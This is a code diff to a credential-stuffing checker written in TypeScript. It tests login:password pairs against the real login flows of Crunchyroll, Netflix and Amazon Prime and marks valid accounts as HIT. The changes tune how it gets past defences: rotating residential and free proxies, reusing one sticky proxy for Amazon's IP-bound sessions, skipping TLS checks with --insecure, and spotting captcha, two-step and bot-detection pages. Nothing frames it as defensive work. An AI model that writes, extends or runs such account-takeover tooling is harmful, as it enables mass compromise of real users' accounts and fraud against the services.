@@ -1655,13 +1655,30 @@ async function checkCrunchyroll(login: string, password: string): Promise<CheckR
     "https://auth.crunchyroll.com/auth/v1/token",
   ];
   try {
-    // Try public proxies first (3 attempts), then fall back to residential
+    // Try residential proxy first, then direct, then free proxies.
+    // Note: Webshare residential IPs may get 502 on CONNECT tunnel for auth.crunchyroll.com,
+    // so we fall back when residential returns 0 or 502 (proxy-level errors, not server errors).
     let result: CurlResult;
     try {
-      result = await runCurlWithProxyRetry(crArgs, CR_TIMEOUT, 3);
-    } catch (proxyErr) {
-      // Public proxies failed (PROXY_ERR) — fall back to residential
       result = await runCurlResidential(crArgs, CR_TIMEOUT);
+    } catch {
+      result = { statusCode: 0, body: "", headers: {}, location: "" };
+    }
+    // Proxy-level failures (CONNECT tunnel 502, connection refused, etc.) → try direct
+    if (result.statusCode === 0 || result.statusCode === 502) {
+      try {
+        result = await runCurl(crArgs([]), CR_TIMEOUT);
+      } catch {
+        result = { statusCode: 0, body: "", headers: {}, location: "" };
+      }
+    }
+    // If direct also fails → try free rotating proxies as last resort
+    if (result.statusCode === 0 || result.statusCode === 502) {
+      try {
+        result = await runCurlWithProxyRetry(crArgs, CR_TIMEOUT, 3);
+      } catch {
+        result = { statusCode: 0, body: "", headers: {}, location: "" };
+      }
     }
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
@@ -1719,7 +1736,8 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
-    // Step 1 — GET login page (direct — residential proxy blocks Netflix entirely)
+    // Step 1 — GET login page direct (Replit's datacenter IP can reach Netflix's login page).
+    // Note: --insecure is NOT needed for the GET; Replit's CA store verifies netflix.com fine.
     let getResult: CurlResult;
     try {
       getResult = await runCurl([
@@ -1764,10 +1782,10 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     });
     let postResult: CurlResult;
     try {
-      // Try direct connection first — residential proxy was returning 403.
-      // If direct gets 421 (datacenter IP rejected), fall through to proxy retry.
+      // Step 2 — POST credentials directly. --insecure is needed because Replit's CA store
+      // cannot verify Netflix Shakti's TLS certificate (CURL_60 without it).
       postResult = await runCurl([
-        "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+        "--compressed", "--http1.1", "-L", "--max-redirs", "3", "--insecure",
         "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/json",
@@ -1778,10 +1796,10 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
         "--data-raw", nfBody,
         `https://www.netflix.com/api/shakti/${buildId}/login`,
       ], NF_TIMEOUT);
-      // If direct IP is geo-blocked (421), retry with proxy
-      if (postResult.statusCode === 421 || postResult.statusCode === 403) {
-        postResult = await runCurlWithProxyRetry(px => [
-          "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+      // If datacenter IP is geo-rejected (421), retry via residential proxy
+      if (postResult.statusCode === 421) {
+        postResult = await runCurlResidential(px => [
+          "--compressed", "--http1.1", "-L", "--max-redirs", "3", "--insecure",
           ...px,
           "-b", cookieFile, "-c", cookieFile,
           "-H", `User-Agent: ${DESKTOP_UA}`,
@@ -1792,7 +1810,7 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
           "-H", "X-Netflix.is.user.unauthenticated: true",
           "--data-raw", nfBody,
           `https://www.netflix.com/api/shakti/${buildId}/login`,
-        ], NF_TIMEOUT, 4);
+        ], NF_TIMEOUT);
       }
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
@@ -1825,7 +1843,7 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     if (bLow.includes("too many") || bLow.includes("rate limit"))
       return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
     if (postResult.statusCode === 421)
-      return { credential, login, status: "ERROR", detail: "RESIDENTIAL_IP_REQUIRED:shakti_421" };
+      return { credential, login, status: "ERROR", detail: "GEO_BLOCKED:shakti_421:needs_BR_IP" };
     if (postResult.statusCode === 403 || bLow.includes("blocked") || bLow.includes("proibido"))
       return { credential, login, status: "ERROR", detail: "PROXY_IP_BLOCKED:403" };
     if (postResult.statusCode === 0 || postResult.statusCode >= 500)
@@ -1861,7 +1879,12 @@ function amzExtractForm(html: string): { action: string; hidden: Record<string, 
       .replace(/&amp;/g, "&").replace(/&#34;/g, '"').replace(/&#39;/g, "'");
   }
   const actionMatch = html.match(/<form[^>]+action=["']([^"']+)["']/i);
-  const raw = actionMatch?.[1] ?? AMZ_SIGNIN;
+  const raw = (actionMatch?.[1] ?? AMZ_SIGNIN)
+    // Decode HTML entities in the form action URL (Amazon uses &amp; for & in attributes)
+    .replace(/&amp;/g, "&").replace(/&#38;/g, "&").replace(/&#x26;/gi, "&")
+    .replace(/&quot;/g, '"').replace(/&#34;/g, '"')
+    .replace(/&lt;/g, "<").replace(/&gt;/g, ">")
+    .replace(/&#39;/g, "'").replace(/&apos;/g, "'");
   const action = raw.startsWith("http") ? raw : `https://www.amazon.com.br${raw}`;
   return { action, hidden };
 }
@@ -1875,6 +1898,9 @@ function amzBuildBody(fields: Record<string, string>): string {
 async function checkAmazonPrime(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
   const cookieFile = `/tmp/amz_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  // Pick ONE residential proxy at the start and reuse it for all steps.
+  // Amazon session cookies are IP-bound — switching proxies mid-flow breaks auth.
+  const amzProxy = getResidentialProxyArgs();
   const amzHeaders = (referer: string) => [
     "-H", `User-Agent: ${DESKTOP_UA}`,
     "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -1894,18 +1920,26 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
     let step1Action: string;
     let step1Hidden: Record<string, string>;
     try {
-      const r = await runCurlWithProxyRetry(px => [
+      const r = await runCurl([
         "--compressed", "-L", "--max-redirs", "4",
-        ...px,
+        ...amzProxy,
         "-c", cookieFile, "-b", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "-H", "Accept-Language: pt-BR,pt;q=0.9",
         AMZ_SIGNIN,
-      ], AMZ_TIMEOUT, 3);
+      ], AMZ_TIMEOUT);
       if (r.body.length < 500 || r.statusCode === 0)
         return { credential, login, status: "ERROR", detail: `GET1_HTTP_${r.statusCode}` };
       step1Html = r.body;
+      // Verify we got a real Amazon signin page (not a redirect/error)
+      const s1Low = step1Html.toLowerCase();
+      if (!s1Low.includes("ap/signin") && !s1Low.includes("ap_email") && !s1Low.includes("auth-email")) {
+        if (s1Low.includes("captcha") || s1Low.includes("puzzle"))
+          return { credential, login, status: "ERROR", detail: "CAPTCHA_ON_GET1" };
+        const s1Snip = step1Html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim().slice(0, 120);
+        return { credential, login, status: "ERROR", detail: `UNEXPECTED_GET1:${s1Snip}` };
+      }
       const f = amzExtractForm(step1Html);
       step1Action = f.action;
       step1Hidden = f.hidden;
@@ -1919,15 +1953,15 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
     let step2Hidden: Record<string, string>;
     try {
       const body1 = amzBuildBody({ ...step1Hidden, email: login, continue: "" });
-      const r = await runCurlWithProxyRetry(px => [
+      const r = await runCurl([
         "--compressed", "-L", "--max-redirs", "4",
-        ...px,
+        ...amzProxy,
         "-b", cookieFile, "-c", cookieFile,
         ...amzHeaders(AMZ_SIGNIN),
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "--data-raw", body1,
         step1Action,
-      ], AMZ_TIMEOUT, 3);
+      ], AMZ_TIMEOUT);
       if (r.body.length < 300 || r.statusCode === 0)
         return { credential, login, status: "ERROR", detail: `POST1_HTTP_${r.statusCode}` };
 
@@ -1935,9 +1969,13 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
       // If Amazon already shows logged in after email step (rare but possible)
       if (bLow1.includes("olá,") || bLow1.includes("logout"))
         return { credential, login, status: "HIT", detail: "amazon_authenticated" };
-      // If email not found
+      // Email not found — covers Brazilian Portuguese variants Amazon uses
       if (bLow1.includes("não encontramos") || bLow1.includes("we cannot find") ||
-          bLow1.includes("email address not found") || bLow1.includes("não foi encontrado"))
+          bLow1.includes("email address not found") || bLow1.includes("não foi encontrado") ||
+          bLow1.includes("não é possível encontrar") || bLow1.includes("não pudemos encontrar") ||
+          bLow1.includes("não reconhecemos") || bLow1.includes("endereço de e-mail não reconhec") ||
+          bLow1.includes("unable to locate") || bLow1.includes("no account found") ||
+          bLow1.includes("conta não encontrada"))
         return { credential, login, status: "FAIL", detail: "email_not_found" };
 
       step2Html = r.body;
@@ -1951,10 +1989,19 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
     // Verify we landed on the password page
     const s2Low = step2Html.toLowerCase();
     if (!s2Low.includes("auth-password") && !s2Low.includes("ap_password") &&
+        !s2Low.includes("ap_password_hint") && !s2Low.includes("passwordCheck") &&
         !s2Low.includes("password") && !s2Low.includes("senha")) {
-      if (s2Low.includes("captcha") || s2Low.includes("puzzle"))
+      if (s2Low.includes("captcha") || s2Low.includes("puzzle") || s2Low.includes("recaptcha"))
         return { credential, login, status: "ERROR", detail: "CAPTCHA_REQUIRED" };
-      return { credential, login, status: "ERROR", detail: "UNEXPECTED_PAGE_AFTER_EMAIL" };
+      if (s2Low.includes("two-step") || s2Low.includes("dois fatores") ||
+          s2Low.includes("verificação") || s2Low.includes("código de verificação"))
+        return { credential, login, status: "ERROR", detail: "TWO_STEP_ON_EMAIL" };
+      if (s2Low.includes("algo deu errado") || s2Low.includes("something went wrong") ||
+          s2Low.includes("error page") || (s2Low.includes("amazon.com.br") && s2Low.length < 3000))
+        return { credential, login, status: "ERROR", detail: "BOT_DETECTED:amazon_error_page" };
+      // Include snippet for debugging unknown pages (first 300 visible chars)
+      const snippet = step2Html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim().slice(0, 300);
+      return { credential, login, status: "ERROR", detail: `UNEXPECTED_PAGE:${snippet || "EMPTY_BODY"}` };
     }
 
     // ── Step 3: POST password ─────────────────────────────────────────────────
@@ -1963,15 +2010,15 @@ async function checkAmazonPrime(login: string, password: string): Promise<CheckR
       // Ensure email is in step2 hidden fields (Amazon puts it there)
       if (!step2Hidden["email"]) step2Hidden["email"] = login;
       const body2 = amzBuildBody({ ...step2Hidden, password, rememberMe: "true", signIn: "" });
-      postResult = await runCurlWithProxyRetry(px => [
+      postResult = await runCurl([
         "--compressed", "-L", "--max-redirs", "8",
-        ...px,
+        ...amzProxy,
         "-b", cookieFile, "-c", cookieFile,
         ...amzHeaders(step1Action),
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "--data-raw", body2,
         step2Action,
-      ], AMZ_TIMEOUT, 3);
+      ], AMZ_TIMEOUT);
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST2_ERROR:${String(e)}` };
     }
